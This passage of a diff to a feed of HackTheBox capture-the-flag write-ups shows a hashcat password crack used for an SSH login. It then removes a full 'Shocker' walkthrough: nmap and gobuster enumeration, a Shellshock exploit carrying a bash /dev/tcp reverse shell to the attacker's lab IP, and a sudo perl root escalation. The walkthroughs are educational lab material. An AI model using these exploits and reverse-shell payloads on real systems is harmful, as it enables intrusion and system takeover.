+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\t</span>ools<span class="se">\h</span>ashcat6&gt; hashcat.exe -m <span class="m">7900</span> <span class="s2">&#34;</span><span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span><span class="s2">.oOsUf1xAhaadURt&#34;</span> rockyou.txt
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+<span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span>.oOsUf1xAhaadURt:booboo
 
 Session..........: hashcat
 Status...........: Cracked
 Hash.Name........: Drupal7
-Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
-Time.Started.....: Tue Mar 30 12:03:57 2021 (3 secs)
-Time.Estimated...: Tue Mar 30 12:04:00 2021 (0 secs)
-...[SNIP]...
-</code></pre><h4 id="ssh---brucetherealadmin">SSH - brucetherealadmin</h4>
+Hash.Target......: <span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span>.oOsUf1xAhaadURt
+Time.Started.....: Tue Mar <span class="m">30</span> 12:03:57 <span class="m">2021</span> <span class="o">(</span><span class="m">3</span> secs<span class="o">)</span>
+Time.Estimated...: Tue Mar <span class="m">30</span> 12:04:00 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h4 id="ssh---brucetherealadmin">SSH - brucetherealadmin</h4>
 <p>The password <code>booboo</code> works for <code>brucetherealadmin</code> and can be used on SSH.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.4» 
 $ ssh brucetherealadmin@10.129.90.96
@@ -1113,245 +1460,6 @@ b5fc76...<span class="o">[</span>SNIP<span class="o">]</span>...
 <li><a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting">https://hebo.gitbook.io/hackbook/active-directory/kerberoasting</a></li>
 <li><a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/</a></li>
 <li><a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Shocker</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</link>
-      <pubDate>Tue, 13 Jul 2021 11:30:31 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</guid>
-      <description>Shocker is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on perl , and this can leveraged as well to gain root shell.
-In the end of this write-up, I&amp;rsquo;ll see how the Shellshock vulnerability works.
-Skills Learned  Exploitation of Shellshock vulnerability Exploitation of sudo privileges on perl  Tools  Nmap Burp Suite Gobuster  Reconnaissance Nmap A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</description>
-      <content:encoded><![CDATA[<p>Shocker is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on <code>perl</code> , and this can leveraged as well to gain root shell.</p>
-<p>In the end of this write-up, I&rsquo;ll see how the Shellshock vulnerability works.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>Exploitation of Shellshock vulnerability</li>
-<li>Exploitation of sudo privileges on perl</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap</li>
-<li>Burp Suite</li>
-<li>Gobuster</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ nmap -p- -sV -oA nmap/10-tcp-allport-shocker 10.10.10.56 
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-10 20:24 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.56
-Host is up <span class="o">(</span>0.065s latency<span class="o">)</span>.
-Not shown: <span class="m">65533</span> closed ports
-PORT     STATE SERVICE VERSION
-80/tcp   open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
-2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 98.00 seconds
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>The site serves only one a text and an image.</p>
-<p><img class="img-container" src="imgs/image-20210711072532615.png" alt="image-20210711072532615"  />
-</p>
-<p>The server response contains uncommon Header called <code>Accept-Ranges</code>. According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests#requesting_a_specific_range_from_a_server">MDN</a>, this header is allows us to control the portion of the HTTP message.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ curl -I http://10.10.10.56
-HTTP/1.1 <span class="m">200</span> OK
-Date: Sun, <span class="m">11</span> Jul <span class="m">2021</span> 00:49:51 GMT
-Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
-Last-Modified: Fri, <span class="m">22</span> Sep <span class="m">2017</span> 20:01:19 GMT
-ETag: <span class="s2">&#34;89-559ccac257884&#34;</span>
-Accept-Ranges: bytes
-Content-Length: <span class="m">137</span>
-Vary: Accept-Encoding
-Content-Type: text/html
-</code></pre></div><p>A <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/apache_range_dos/">quick search</a> on google finds that it can be used for DDoS attack.</p>
-<h4 id="gobuster">Gobuster</h4>
-<p>A <code>gobuster</code> scan finds two directories:  <code>/cgi-bin/</code> and <code>/icons</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-S-80 -f         
-<span class="o">===============================================================</span>
-Gobuster v3.1.0
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.56/
-<span class="o">[</span>+<span class="o">]</span> Method:                  GET
-<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
-<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
-<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
-<span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
-<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/07/10 20:26:07 Starting gobuster in directory enumeration <span class="nv">mode</span>
-<span class="o">===============================================================</span>
-/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 294<span class="o">]</span>
-/icons/               <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 292<span class="o">]</span>
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><p>Another scan on <code>/cgi-bin/</code> discovers a file called <code>users.sh</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-cgi-bin -f -x cgi,sh
-<span class="o">===============================================================</span>
-Gobuster v3.1.0
-by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
-<span class="o">===============================================================</span>
-<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.56/cgi-bin
-<span class="o">[</span>+<span class="o">]</span> Method:                  GET
-<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
-<span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
-<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
-<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
-<span class="o">[</span>+<span class="o">]</span> Extensions:              cgi,sh
-<span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
-<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
-<span class="o">===============================================================</span>
-2021/07/10 21:43:04 Starting gobuster in directory enumeration <span class="nv">mode</span>
-<span class="o">===============================================================</span>
-/user.sh              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 125<span class="o">]</span>
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><p>The <code>script.sh</code> returns the following contents.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
-$ curl -s http://10.10.10.56/cgi-bin/user.sh
-Content-Type: text/plain
-
-Just an uptime <span class="nb">test</span> script
-
- 21:46:09 up <span class="m">1</span> day, 20:28,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.00
-</code></pre></div><p>According to the box name and a <code>/cgi-bin/</code> folder which contains a bash script, it&rsquo;s going to be shellshock vulnerability.</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-shelly">Shell as shelly</h3>
-<h4 id="shellshock-cve-2014-6271">Shellshock (CVE-2014-6271)</h4>
-<p>The Shellshock vulnerability is well explained in this <a href="https://pentesterlab.com/exercises/cve-2014-6271/course">free course</a> by PentesterLab.</p>
-<p>The following is the commonly used PoC for shellshock.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">(){</span>:<span class="o">}</span><span class="p">;</span> echo<span class="p">;</span> &lt;bash command&gt;
-</code></pre></div><p>The PoC works on <code>User-Agent</code> header.</p>
-<p><img class="img-container" src="imgs/image-20210711090447537-1626151933213.png" alt="image-20210711090447537"  />
-</p>
-<p>It also works on the  <code>Accept</code> header (I&rsquo;m shocked now 😄).</p>
-<p><img class="img-container" src="imgs/image-20210711085942731.png" alt="image-20210711085942731"  />
-</p>
-<h4 id="reverse-shell">Reverse Shell</h4>
-<p>I tried to get a shell but somehow it didn&rsquo;t connect back, but then I figured out why after redirecting stderr to stderr, it wanted a full path!</p>
-<p><img class="img-container" src="imgs/image-20210711091930431.png" alt="image-20210711091930431"  />
-</p>
-<p>The installed <code>nc</code> doesn&rsquo;t have <code>-e</code>.</p>
-<p><img class="img-container" src="imgs/image-20210711092401328.png" alt="image-20210711092401328"  />
-</p>
-<p>The following bash reverse shell works.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">()</span> <span class="o">{</span> :<span class="p">;</span><span class="o">}</span><span class="p">;</span> echo<span class="p">;</span> <span class="nb">echo</span> <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.83/53 0&gt;&amp;1&#34;</span> <span class="p">|</span> /bin/bash
-</code></pre></div><p><img class="img-container" src="imgs/image-20210711093314357.png" alt="image-20210711093314357"  />
-</p>
-<h4 id="shell-upgrade">Shell Upgrade</h4>
-<p>I&rsquo;ll upgrade my shell using the PTY trick (that&rsquo;s how I called it).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-shelly@Shocker:/usr/lib/cgi-bin$ script /dev/null -c bash                    
-script /dev/null -c bash
-Script started, file is /dev/null
-shelly@Shocker:/usr/lib/cgi-bin$ ^Z
-<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7339</span> suspended  nc -nvlp <span class="m">53</span>
-→ kali@kali «shocker» «10.10.14.83» 
-$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
-<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7339</span> continued  nc -nvlp <span class="m">53</span>
-
-shelly@Shocker:/usr/lib/cgi-bin$  
-</code></pre></div><p>The user flag is done here.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ ls -l 
-total <span class="m">8</span>
-drwxr-xr-x <span class="m">2</span> shelly shelly <span class="m">4096</span> Jul <span class="m">10</span> 03:31 <span class="nb">test</span>
--r--r--r-- <span class="m">1</span> root   root     <span class="m">33</span> Jul  <span class="m">9</span> 01:17 user.txt
-shelly@Shocker:/home/shelly$ cat user.txt 
-7ac9eb73e6cb...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-root">Shell as root</h3>
-<h4 id="internal-enumeration">Internal Enumeration</h4>
-<p>A quick check on sudo privileges reveals that user <code>shelly</code> can run <code>perl</code> with <code>sudo</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
-sudo -l
-Matching Defaults entries <span class="k">for</span> shelly on Shocker:
-    env_reset, mail_badpass,
-    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User shelly may run the following commands on Shocker:
-    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/perl
-</code></pre></div><h4 id="sudo---perl">Sudo - perl</h4>
-<p>Using <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">GTFOBins</a> as reference, I&rsquo;m now root.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ sudo -u root perl -e <span class="s1">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
-root@Shocker:/home/shelly# id <span class="o">&amp;&amp;</span> hostname
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-Shocker
-root@Shocker:/home/shelly#
-</code></pre></div><p>The root flag.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@Shocker:~# cat root.txt
-e3689b13acb2...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><h2 id="extras">Extras</h2>
-<p>Since this vulnerability is interesting yet dangerous, I&rsquo;d like to observe how it works.</p>
-<h3 id="playing-a-bit-with-shellshock">Playing a bit with Shellshock</h3>
-<p>I did a quick test using the following script which placed under /<code>cgi-bin/</code> folder. The script will prints all the environment variables.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@Shocker:/usr/lib/cgi-bin# <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\necho test\nenv&#39;</span> &gt; iamf.sh
-root@Shocker:/usr/lib/cgi-bin# chmod +x iamf.sh 
-</code></pre></div><p>And now I could understand why it is so dangerous. It even exports my custom header and turns it into an environment variable.</p>
-<p><img class="img-container" src="imgs/image-20210711100705447.png" alt="image-20210711100705447"  />
-</p>
-<p>The full response</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">HTTP/1.1 200 OK
-Date: Sun, 11 Jul 2021 03:06:31 GMT
-Server: Apache/2.4.18 (Ubuntu)
-Connection: close
-Content-Type: text/x-sh
-Content-Length: 1113
-
-iamf
-test
-SERVER_SIGNATURE=&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80&lt;/address&gt;
-
-HTTP_USER_AGENT=Blackhole
-SERVER_PORT=80
-HTTP_HOST=10.10.10.56
-DOCUMENT_ROOT=/var/www/html
-SCRIPT_FILENAME=/usr/lib/cgi-bin/iamf.sh
-REQUEST_URI=/cgi-bin/iamf.sh
-SCRIPT_NAME=/cgi-bin/iamf.sh
-HTTP_CONNECTION=close
-REMOTE_PORT=58222
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-HTTP_IF_NONE_MATCH=&#34;89-559ccac257884-gzip&#34;
-CONTEXT_PREFIX=/cgi-bin/
-PWD=/usr/lib/cgi-bin
-SERVER_ADMIN=webmaster@localhost
-REQUEST_SCHEME=http
-HTTP_IF_MODIFIED_SINCE=Fri, 22 Sep 2017 20:01:19 GMT
-HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
-HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-REMOTE_ADDR=10.10.14.83
-SHLVL=1
-SERVER_NAME=10.10.10.56
-CONTENT_LENGTH=0
-SERVER_SOFTWARE=Apache/2.4.18 (Ubuntu)
-QUERY_STRING=
-SERVER_ADDR=10.10.10.56
-GATEWAY_INTERFACE=CGI/1.1
-HTTP_UPGRADE_INSECURE_REQUESTS=1
-SERVER_PROTOCOL=HTTP/1.1
-HTTP_CACHE_CONTROL=max-age=0
-HTTP_ACCEPT_ENCODING=gzip, deflate
-REQUEST_METHOD=GET
-CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
-HTTP_IAMF_HEADER=() {  :
-}
-_=/usr/bin/env
-</code></pre></div><hr>
-<h2 id="references">Reference(s)</h2>
-<ul>
-<li><a href="https://pentesterlab.com/exercises/cve-2014-6271/course">https://pentesterlab.com/exercises/cve-2014-6271/course</a></li>
-<li><a href="https://gtfobins.github.io/gtfobins/perl/#sudo">https://gtfobins.github.io/gtfobins/perl/#sudo</a></li>
 </ul>
 ]]></content:encoded>
     </item>
